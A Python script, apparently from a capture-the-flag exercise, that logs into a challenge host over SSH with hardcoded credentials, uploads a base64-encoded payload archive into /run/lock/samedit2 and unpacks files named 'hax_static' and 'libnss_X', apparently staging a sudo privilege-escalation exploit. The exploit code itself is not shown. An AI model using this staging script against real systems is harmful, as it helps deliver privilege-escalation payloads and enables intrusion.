#!/usr/bin/env python3
"""Upload payload.tgz to /run/lock/samedit2 and extract. No PTY needed."""
import base64
import sys
import time

import paramiko

HOST = "0.cloud.chals.io"
PORT = 32779
USER = "maya.chen"
PASS = "Onboard-Maya25!"
PAYLOAD = "/home/boss/Works/ctf/KPMG/VodooSpiritOfDeath2/artifacts/payload.tgz"
STAGE = "/run/lock/samedit2"


def main():
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username=USER, password=PASS,
              timeout=30, allow_agent=False, look_for_keys=False)

    def run(cmd, timeout=60):
        _, out, err = c.exec_command(cmd, timeout=timeout)
        o = out.read().decode(errors="replace")
        e = err.read().decode(errors="replace")
        print("$ " + cmd)
        print(o.strip())
        if e.strip():
            print("[stderr]", e.strip())
        return o

    run("rm -rf %s; mkdir -p %s && echo stage-ready" % (STAGE, STAGE))

    data = base64.b64encode(open(PAYLOAD, "rb").read())
    print("uploading %d bytes b64..." % len(data))
    chan = c.get_transport().open_session()
    chan.settimeout(120)
    chan.exec_command("base64 -d > %s/payload.tgz; echo RC=$?; ls -l %s" % (STAGE, STAGE))
    time.sleep(0.5)
    for i in range(0, len(data), 32768):
        chan.sendall(data[i:i + 32768])
    chan.shutdown_write()
    buf = b""
    try:
        while True:
            d = chan.recv(65536)
            if not d:
                break
            buf += d
    except Exception:
        pass
    print(buf.decode(errors="replace"))

    run("cd %s && tar xzf payload.tgz -C . && find . -type f -exec ls -l {} \\; && "
        "mkdir -p out && mv hax_static out/ && mv libnss_X out/ && ls -laR out" % STAGE)
    c.close()


if __name__ == "__main__":
    main()